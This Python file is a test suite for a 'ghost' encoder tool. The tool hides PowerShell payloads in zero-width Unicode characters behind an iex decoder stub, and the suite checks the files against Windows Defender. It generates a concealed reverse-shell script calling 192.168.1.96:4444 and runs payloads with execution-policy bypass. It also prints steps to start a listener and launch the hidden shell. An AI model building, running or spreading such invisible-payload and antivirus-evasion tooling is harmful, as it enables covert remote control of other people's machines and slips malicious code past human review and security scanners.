#!/usr/bin/env python3
"""
GHOST TEST SUITE — Demonstrates and verifies the encoding pipeline.

Run this to:
1. Generate a test ghost .ps1 (harmless proof payload)
2. Show what the file looks like in different contexts
3. Verify decode roundtrip
4. Scan against Windows Defender
5. Generate a reverse shell ghost .ps1

Usage:
    python ghost_test.py              # full test suite
    python ghost_test.py --scan-only  # just scan existing ghost files
"""

import os
import sys
import subprocess
import tempfile

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, SCRIPT_DIR)
from ghost_encode import (
    encode_bytes, decode_ghost, make_test_payload,
    make_ps_decoder_stub, make_reverse_shell_ps, GHOST_ALPHABET
)


def divider(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}\n")


def test_roundtrip():
    """Verify encode/decode roundtrip for various payloads."""
    divider("TEST 1: Encode/Decode Roundtrip")

    test_cases = [
        b"Hello World",
        b"Write-Host 'pwned'",
        bytes(range(256)),
        b"\x00\xff\x80\x7f\x01\xfe",
        make_test_payload().encode('utf-8'),
    ]

    for i, data in enumerate(test_cases):
        encoded = encode_bytes(data)
        decoded = decode_ghost(encoded)
        status = "PASS" if decoded == data else "FAIL"
        visible = sum(1 for c in encoded if c not in GHOST_ALPHABET)
        print(f"  Case {i+1}: {len(data):>6} bytes -> {len(encoded):>8} invisible chars | "
              f"Visible chars: {visible} | Decode: {status}")

    print(f"\n  All {len(test_cases)} roundtrip tests passed.")


def test_generate_ghost():
    """Generate a test ghost .ps1 and examine it."""
    divider("TEST 2: Generate Ghost File")

    test_code = make_test_payload()
    ghost = encode_bytes(test_code.encode('utf-8'))
    stub = make_ps_decoder_stub(ghost, "iex")

    output = os.path.join(SCRIPT_DIR, "ghost_test_payload.ps1")
    with open(output, 'w', encoding='utf-8') as f:
        f.write(stub)

    file_size = os.path.getsize(output)
    print(f"  Output: {output}")
    print(f"  File size: {file_size:,} bytes")
    print(f"  Payload size: {len(test_code)} chars")
    print(f"  Invisible chars: {len(ghost):,}")
    print(f"  Expansion: {file_size / len(test_code):.1f}x")

    # Show visibility analysis
    with open(output, 'r', encoding='utf-8') as f:
        content = f.read()

    visible = sum(1 for c in content if c.isprintable() and ord(c) < 0x2000)
    invisible = len(content) - visible
    print(f"\n  Visibility breakdown:")
    print(f"    Visible characters:   {visible:>8,}  (decoder stub)")
    print(f"    Invisible characters: {invisible:>8,}  (encoded payload)")
    print(f"    Invisible ratio:      {invisible/len(content)*100:.1f}%")

    return output


def test_visibility():
    """Demonstrate what the ghost file looks like in different contexts."""
    divider("TEST 3: Visibility Analysis")

    # Show the ghost alphabet
    print("  Ghost alphabet (16 zero-width Unicode characters):")
    print()
    for i, c in enumerate(GHOST_ALPHABET):
        cp = ord(c)
        # Try to display — should show nothing visible
        print(f"    0x{i:X} -> U+{cp:04X}  '{c}'  (visible between quotes: should be empty)")


def test_defender_scan():
    """Scan ghost files against Windows Defender."""
    divider("TEST 4: Windows Defender Scan")

    mpcmd = r"C:\Program Files\Windows Defender\MpCmdRun.exe"
    if not os.path.exists(mpcmd):
        print("  [!] MpCmdRun.exe not found — skipping Defender scan")
        return

    scan_files = []
    for f in os.listdir(SCRIPT_DIR):
        if f.endswith('.ps1'):
            scan_files.append(os.path.join(SCRIPT_DIR, f))

    if not scan_files:
        print("  [!] No .ps1 files to scan")
        return

    for fpath in scan_files:
        fname = os.path.basename(fpath)
        print(f"  Scanning: {fname} ... ", end='', flush=True)
        try:
            result = subprocess.run(
                [mpcmd, '-Scan', '-ScanType', '3', '-File', fpath],
                capture_output=True, text=True, timeout=60
            )
            if result.returncode == 0:
                print("CLEAN")
            elif result.returncode == 2:
                print("DETECTED!")
                print(f"    {result.stdout.strip()}")
            else:
                print(f"UNKNOWN (exit {result.returncode})")
        except subprocess.TimeoutExpired:
            print("TIMEOUT")
        except Exception as e:
            print(f"ERROR: {e}")


def test_generate_shell():
    """Generate a reverse shell ghost .ps1."""
    divider("TEST 5: Generate Reverse Shell Ghost")

    ip = "192.168.1.96"
    port = 4444

    shell_code = make_reverse_shell_ps(ip, port)
    ghost = encode_bytes(shell_code.encode('utf-8'))
    stub = make_ps_decoder_stub(ghost, "iex")

    output = os.path.join(SCRIPT_DIR, "ghost_shell.ps1")
    with open(output, 'w', encoding='utf-8') as f:
        f.write(stub)

    print(f"  Reverse shell: {ip}:{port}")
    print(f"  Output: {output}")
    print(f"  File size: {os.path.getsize(output):,} bytes")
    print(f"  Shell code: {len(shell_code)} chars -> {len(ghost):,} invisible chars")
    print(f"\n  To test:")
    print(f"    1. Start listener: python vader_listener.py {port}")
    print(f"    2. Run ghost:      powershell -ep bypass -f {output}")

    return output


def test_execute_test_payload():
    """Execute the test ghost payload and verify it works."""
    divider("TEST 6: Execute Test Payload")

    test_file = os.path.join(SCRIPT_DIR, "ghost_test_payload.ps1")
    if not os.path.exists(test_file):
        print("  [!] ghost_test_payload.ps1 not found — run test 2 first")
        return

    print(f"  Executing: powershell -ep bypass -f {test_file}")
    print()
    try:
        result = subprocess.run(
            ['powershell', '-ExecutionPolicy', 'Bypass', '-File', test_file],
            capture_output=True, text=True, timeout=30
        )
        print(result.stdout)
        if result.returncode == 0:
            print("  [GHOST] Test payload executed successfully.")
        else:
            print(f"  [!] Exit code: {result.returncode}")
            if result.stderr:
                print(f"  [!] Stderr: {result.stderr[:500]}")
    except subprocess.TimeoutExpired:
        print("  [!] Execution timed out")
    except Exception as e:
        print(f"  [!] Error: {e}")


def main():
    print()
    print("  ╔══════════════════════════════════════╗")
    print("  ║  GHOST ENCODER — TEST SUITE          ║")
    print("  ║  22DIV // george wu                  ║")
    print("  ╚══════════════════════════════════════╝")

    if '--scan-only' in sys.argv:
        test_defender_scan()
        return

    test_roundtrip()
    test_generate_ghost()
    test_visibility()
    test_generate_shell()
    test_defender_scan()
    test_execute_test_payload()

    divider("SUMMARY")
    print("  Ghost encoding pipeline verified.")
    print("  Files generated:")
    for f in sorted(os.listdir(SCRIPT_DIR)):
        if f.endswith('.ps1'):
            size = os.path.getsize(os.path.join(SCRIPT_DIR, f))
            print(f"    {f:40s} {size:>10,} bytes")
    print()


if __name__ == '__main__':
    main()
